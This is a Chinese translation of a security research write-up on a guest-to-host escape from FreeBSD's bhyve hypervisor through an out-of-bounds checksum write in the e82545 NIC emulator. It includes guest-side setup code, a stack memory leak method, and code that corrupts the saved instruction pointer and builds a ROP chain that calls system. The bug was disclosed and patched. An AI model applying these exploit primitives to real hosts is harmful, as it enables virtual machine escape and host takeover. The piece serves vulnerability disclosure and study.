文章目录：

  * 【二进制分析】DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞
    * 介绍
    * 环境
    * E82545 仿真器 数据包传输
    * NIC 网卡设置
    * 漏洞挖掘
    * 虚拟机逃逸
      * 内存泄漏
      * 代码执行
    * CAPSICUM 沙盒

# 【二进制分析】DHYVE 逃逸：FreeBSD系统的虚拟机逃逸漏洞

原文链接：<https://www.synacktiv.com/en/publications/escaping-from-bhyve>  
翻译感受：这篇文章主要关注于操作系统的漏洞利用，并且有详细的过程分析。

>
> Bhyve是FreeBSD的一种虚拟化程序。本篇文章描述了如何将适配器模拟器中的限制OOB写入漏洞转化为代码执行漏洞，从而实现逃离虚拟机的目的。介绍如下：

## 介绍

早在2017年，我曾在Phrack杂志上发表过一篇关于Qemu中的虚拟机逃逸的文章。漏洞存在于两个网卡的设备模拟器中：RTL8139和PCNET。在Reno
Robert在同一期的Phrack杂志上发表了有关bhyve中几个虚拟机逃脱的论文之后，我决定审计可用的网络设备仿真器的代码。

AMD PCNET仿真器中的错误与插入分配缓冲区限制之外的校验和有关。我在PCI
E82545仿真器中发现了类似的漏洞，位于UDP数据包校验和被插入到受控索引处。接下来，我将介绍如何将两个字节的基于堆栈的溢出转化为代码执行。

## 环境

由于我没有在计算机上安装FreeBSD，因此我需要启用嵌套虚拟化的QEMU/KVM虚拟机中运行bhyve
hypervisor。主机机器正在运行FreeBSD 13.0-RELEASE releng/13.0。客户端虚拟机也是一个由vm-bhyve管理的FreeBSD，其配置如下：

    
    
    root@freelsd:~ # vm configure freebsd
    loader="bhyveload"
    cpu=1
    memory=2048M
    network0_type="e1000"
    network0_switch="target"
    network0_mac="58:9c:fc:0f:b4:44"
    network1_type="virtio-net"
    network1_switch="ssh"
    network1_mac="58:9c:fc:04:49:ac"
    disk0_type="virtio-blk"
    disk0_name="disk0.img"
    

## E82545 仿真器 数据包传输

函数e82545_transmit(pci_e82545.c)负责传输数据包。该函数遍历数据包描述符的环形缓冲区，并填充一个iovec结构的缓冲区：

有三种类型的数据包描述符：

  * E1000_TXD_TYP_C：这种类型是上下文描述符。相关的数据结构（e1000_context_desc）编码，包含了标头和有效载荷长度以及IP和TCP校验和偏移量等信息。
  * E1000_TXD_TYP_D：这个类型是数据描述符。相关的数据结构（e1000_data_desc）保存数据缓冲区物理地址的指针。
  * E1000_TXD_TYP_L：这个类型是传统的数据描述符。

![](./img/922993239961816808.png)

数据包通过调用e82545_transmit_backend提交，最终会调用以下函数：

## NIC 网卡设置

为了触发我们的漏洞，我们首先需要设置网卡。e1000网络适配器有几个寄存器可以通过`in*()`和`out*()`原语（来自machine/cpufunc.h）进行配置。这里需要注意，这些函数在Linux头文件sys/io.h中的默认配置与FreeBSD中不同，所以在弄清楚参数端口和数据在FreeBSD中交换之前，我遇到了一些错误配置。

这里需要的是配置TX描述符的环形缓冲区：

    
    
    tx_size = tx_nb * sizeof(union e1000_tx_udesc);
    tx_ring = aligned_alloc(PAGE_SIZE, tx_size);
    memset(tx_ring, 0, tx_size);
    
    for(int i = 0; i < tx_nb; i++) {
        buffer = aligned_alloc(PAGE_SIZE, BUFF_SIZE);
        memcpy(buffer, packet, sizeof(packet));
    
        tx_buffer[i] = buffer;
        addr = gva_to_gpa(buffer);
        warnx("TX ring buffer at 0x%"PRIx64"\n", addr);
        tx_ring[i].dd.buffer_addr = addr;
    };
    

对于每个TX描述符，我们都需要提供保存要传输数据的缓冲区的物理地址。但是我没有在用户空间找到任何暴露的接口（例如/proc中没有pagemap）将虚拟地址转换为物理地址。所以，我自己编写了一个小型内核模块（`pt.ko`），用于执行这种转换：

    
    
    #include <sys/types.h>
    #include <sys/param.h>
    #include <sys/proc.h>
    #include <sys/module.h>
    #include <sys/sysent.h>
    #include <sys/kernel.h>
    #include <sys/sysproto.h>
    #include <sys/systm.h>
    
    #include <vm/vm.h>
    #include <vm/pmap.h>
    #include <vm/vm_map.h>
    
    struct pt_args
    {
        vm_offset_t vaddr;
        uint64_t    *res;
    };
    
    static int pt(struct thread *td, void *args)
    {
        struct pmap *pmap;
        struct pt_args *user = args;
    
        vm_offset_t vaddr = user->vaddr;
        uint64_t *res = user->res;
    
        uint64_t paddr;
    
        pmap = &td->td_proc->p_vmspace->vm_pmap;
        paddr = pmap_extract(pmap, vaddr);
    
        return copyout(&paddr, res, sizeof(uint64_t));
    }
    
    static struct sysent pt_sysent = {
       .sy_narg = 2,
       .sy_call = pt
    };
    
    static int offset=NO_SYSCALL;
    
    static int load(struct module *module, int cmd, void *arg)
    {
        int error=0;
        switch(cmd) {
            case MOD_LOAD:
                uprintf("loading syscall at offset %d\n", offset);
                break;
            case MOD_UNLOAD:
                uprintf("unloading syscall from offset %d\n", offset);
                break;
            default:
                error=EOPNOTSUPP;
                break;
        }
        return error;
    }
    
    SYSCALL_MODULE(pt, &offset, &pt_sysent, load, NULL);
    

最后一步就是更新适配器中的描述符表地址了：

    
    
    warnx("disable TX");
    e1000_tx_disable();
    
    addr = gva_to_gpa(tx_ring);
    
    warnx("update TX desc table");
    e1000_write_reg(TDBAL, (uint32_t)addr);  /* desc table addr, low bits */
    e1000_write_reg(TDBAH, addr >> 32);      /* desc table addr, hi 32-bits */
    e1000_write_reg(TDLEN, tx_size);         /* # descriptors in bytes */
    e1000_write_reg(TDH, 0);                 /*desc table head idx */
    
    warnx("enable TX");
    e1000_tx_enable();
    

## 漏洞挖掘

漏洞存在于`e82545_transmit`函数中。就像以下代码片段所示，如果启用了TCP分段卸载（例如tso ==
1），则从数据包上下文描述符中检索数据包头的长度（`hdrlen`）。

代码确保长度值不超过240字节的最大大小，并检查长度是否足够插入VLAN标记、IP和TCP校验和。

但是在非TCP数据包（例如UDP数据包）的情况下，没有对校验和偏移量（`ckinfo[1].ck_off`）进行检查。

[1]处缺失的检查导致[3]处和[4]处中的OOB读取和写入。该漏洞允许攻击者在[2]处分配给超过堆栈的限制的数据包头，来编写受控数据（计算的校验和）。

    
    
    e82545_transmit(struct e82545_softc *sc, uint16_t head, uint16_t tail,
        uint16_t dsize, uint16_t *rhead, int *tdwb)
    {
    
        /* ... */
    
        /* Simple non-TSO case. */
        if (!tso) {
            /* ... */
        } else {
            /* In case of TSO header length provided by software. */
            hdrlen = sc->esc_txctx.tcp_seg_setup.fields.hdr_len;
    
            if (hdrlen > 240) {
                WPRINTF("TSO hdrlen too large: %d", hdrlen);
                goto done;
            }
    
            if (vlen != 0 && hdrlen < ETHER_ADDR_LEN*2) {
                WPRINTF("TSO hdrlen too small for vlan insertion "
                    "(%d vs %d) -- dropped", hdrlen,
                    ETHER_ADDR_LEN*2);
                goto done;
            }
    
            if (hdrlen < ckinfo[0].ck_start + 6 ||
                hdrlen < ckinfo[0].ck_off + 2) {
                WPRINTF("TSO hdrlen too small for IP fields (%d) "
                    "-- dropped", hdrlen);
                goto done;
            }
    
            if (sc->esc_txctx.cmd_and_length & E1000_TXD_CMD_TCP) {
                if (hdrlen < ckinfo[1].ck_start + 14 ||
                    (ckinfo[1].ck_valid &&
                    hdrlen < ckinfo[1].ck_off + 2)) {
                    WPRINTF("TSO hdrlen too small for TCP fields "
                        "(%d) -- dropped", hdrlen);
                    goto done;
                }
            } else {
                if (hdrlen < ckinfo[1].ck_start + 8) {
                    WPRINTF("TSO hdrlen too small for UDP fields "
                        "(%d) -- dropped", hdrlen);
                    // [1] Missing check on ckinfo[1].ck_off
                    goto done;
                }
            }
        }
    
        /* Allocate, fill and prepend writable header vector. */
        if (hdrlen != 0) {
            // [2] Allocation of vulnerable buffer
            hdr = __builtin_alloca(hdrlen + vlen);
            /* ...*/
        }
    
        /* ... */
    
        /* Doing TSO. */
    
        if (ckinfo[1].ck_valid) /* Save partial pseudo-header checksum. */
            tcpcs = *(uint16_t *)&hdr[ckinfo[1].ck_off]; // [3] OOB Read
    
        /* ... */
    
        pv = 1;
        pvoff = 0;
        for (seg = 0, left = paylen; left > 0; seg++, left -= now) {
    
            /* ... */
    
            /* Calculate checksums and transmit. */
            if (ckinfo[0].ck_valid) {
                *(uint16_t *)&hdr[ckinfo[0].ck_off] = ipcs;
                e82545_transmit_checksum(tiov, tiovcnt, &ckinfo[0]);
            }
            if (ckinfo[1].ck_valid) {
                *(uint16_t *)&hdr[ckinfo[1].ck_off] =
                    e82545_carry(tcpsum); // [4] OOB Write
                e82545_transmit_checksum(tiov, tiovcnt, &ckinfo[1]);
            }
            e82545_transmit_backend(sc, tiov, tiovcnt);
        }
    
        /* ... */
    }
    

该漏洞于2022年3月7日向FreeBSD安全团队进行了报告。一个安全通告<https://www.freebsd.org/security/advisories/FreeBSD-SA-22:05.bhyve.asc在初始报告后一个月发布。在披露这个漏洞之后，我注意到Reno>
Robert在2019年报告了类似的问题（CVE-2019-5609<https://www.freebsd.org/security/advisories/FreeBSD-SA-19:21.bhyve.asc）。但是仍然包含可绕过的漏洞，导致提交的补丁不完整，并没有完全解决该问题。>

## 虚拟机逃逸

### 内存泄漏

该漏洞允许在任意偏移量处写入两个受控字节。然而，偏移量只有1字节大小，这限制了攻击场景的使用。

根据下面显示的堆栈布局，通常目标（保存的指令指针、保存的帧指针）无法从分配的易受攻击的缓冲区中获得。尽管如此，`hdr`指针仍然可以被中断：

![](./img/3079352203010702106.png)

`hdr`指针会在分段循环中使用，如下所示：

    
    
    pv = 1;
    pvoff = 0;
    for (seg = 0, left = paylen; left > 0; seg++, left -= now) {
        now = MIN(left, mss);
        /* Construct IOVs for the segment. */
        /* Include whole original header. */
        tiov[0].iov_base = hdr;
        tiov[0].iov_len = hdrlen;
        tiovcnt = 1;
        /* Include respective part of payload IOV. */
        for (nleft = now; pv < iovcnt && nleft > 0; nleft -= nnow) {
            nnow = MIN(nleft, iov[pv].iov_len - pvoff);
            tiov[tiovcnt].iov_base = iov[pv].iov_base + pvoff;
            tiov[tiovcnt++].iov_len = nnow;
            if (pvoff + nnow == iov[pv].iov_len) {
                pv++;
                pvoff = 0;
        } else
            pvoff += nnow;
    
        /* ... */
        e82545_transmit_backend(sc, tiov, tiovcnt);
    }
    

通过调整`hdr`指针的2个低位字节，可以泄漏堆栈内容的一部分。如果在主机中启用数据包转发功能（在/etc/rc.conf中设置gateway_enable="YES"），那么我们就可以获取包含泄漏内存的UDP数据包。

在客户端机器上运行tcpdump数据包工具后将显示多个堆栈指针：

![](./img/173744246851090050.png)

### 代码执行

非常不可思议的是，在FreeBSD
13.0-RELEASE＃0系统上默认情况下未启用ASLR（空间地址随机化保护）。因此，没有泄漏bhyve进程内存的必要。

如前一节所示，通过打断并获取`hdr`指针，可以强制让主机泄漏bhyve进程堆栈的一部分。特别是如果我们有多个段的话，破坏`hdr`指针是很方便的。

我们可以在第一个迭代循环过程中中更改`hdr`指针的2个低位字节，并利用在第二个迭代循环期间更新`hdr`缓冲区的多个写入。以下负责更新IP头的代码片段允许我们在受控偏移量处写入受控DWORD：

    
    
    for (seg = 0, left = paylen; left > 0; seg++, left -= now) {
        now = MIN(left, mss);
        /* ... */
    
        /* Update IP header. */
        if (sc->esc_txctx.cmd_and_length & E1000_TXD_CMD_IP) {
            /* IPv4 -- set length and ID */
            *(uint16_t *)&hdr[ckinfo[0].ck_start + 2] = htons(hdrlen - ckinfo[0].ck_start + now);
            *(uint16_t *)&hdr[ckinfo[0].ck_start + 4] = htons(ipid + seg);
        }
        /* ... */
    }
    

请注意，这样操作之后UDP数据包也将被更新（有效载荷长度、校验和），这可能会导致parasite写入。

使用上述对`hdr`缓冲区的修改方法，我们可以像下面这样覆盖保存的指令指针：

    
    
    /* corrupt saved rip */
    hdrlen = 32;
    hdroff = 0x90;
    ipcss = 12;
    tucss = 0;
    mss = htons(POP_RBP & 0xffff) - hdrlen + ipcss; // WHAT_LOW
    paylen = 2 * mss;
    pktlen = paylen + hdrlen;
    
    tx_cd.upper_setup.tcp_fields.tucss = tucss;
    tx_cd.upper_setup.tcp_fields.tucse = tucss+1;
    
    tx_cd.cmd_and_length = paylen;
    tx_cd.cmd_and_length |= E1000_TXD_TYP_C;
    tx_cd.cmd_and_length |= E1000_TXD_CMD_IP;
    
    tx_cd.tcp_seg_setup.fields.status = 0;
    tx_cd.tcp_seg_setup.fields.hdr_len = hdrlen;
    tx_cd.tcp_seg_setup.fields.mss = mss;
    
    write_off = SAVED_RIP_OFF - ipcss - 2;
    *(uint16_t *)(tx_buffer[head + 1] + tucss) = ~write_off;                 // WHERE
    *(uint16_t *)(tx_buffer[head + 1] + ipcss + 4) = MAKE_WORD(POP_RBP, 1);  // WHAT_HIGH
    
    e1000_tx_transmit(tx_ring, &head, &tx_cd, pktlen);
    

第一次看，我们可能会尝试破坏保存的帧指针，并将其指向存储在我们ROP链的原始`hdr`缓冲区的开头。然而，函数`e82545_transmit`是从不包含返回的`e82545_tx_thread`中调用的。

因此，我们决定多次使用相对OOB写入原语，方便构建调用system的ROP链。编写完整的ROP链仍然具有困难，因为调用线程的堆栈帧空间非常有限。我们需要注意写入空间大小，以避免超出分配给`e82545_tx`线程的堆栈限制。为了克服这些限制，我们可以编写一个小型链，然后将堆栈移动到存储负责调用系统的有效载荷的原始`hdr`缓冲区的开头。

为了避免将用于写入原语的数据与用作ROP链一部分的数据混合在一起，我需要首先在堆栈中重载我的有效载荷。

在利用相对OOB写入原语之前，我们需要发送一个强制分配大标题的第一个数据包（220字节是我们可以分配的最大长度），并对后续分配使用较小的长度大小。

利用OOB写入原语四次，就可以编写由POP
RBB和LEAVE机器人组成的ROP链。这个最小化的阶段允许像下面的图片所示一样，就像一个旋转堆栈到`hdr`缓冲区的初始分配地址，其中包含调用`system`的有效载荷：

![](./img/2236106336846987238.png)

## CAPSICUM 沙盒

该漏洞可以在未启用Capsicum沙盒（WITHOUT_CAPSICUM）的bhyve管理程序上工作。Capsicum沙盒将阻止运行calc，因为syscall
execve（和许多其他syscall）被过滤掉了。我没有找到办法来绕过Capsicum沙盒的方法。

对于那些感兴趣的人，我强烈推荐阅读Reno
Robert的Phrack论文（[http://www.phrack.org/issues/70/11.html#article
，](http://www.phrack.org/issues/70/11.html#article%EF%BC%89%EF%BC%8C%E5%AE%83%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%B8%80%E7%A7%8D%E6%96%B0%E5%9E%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%9B%92%E7%9A%84%E6%8A%80%E6%9C%AF%E3%80%82)它在其中介绍了一种新型绕过沙盒的技术。

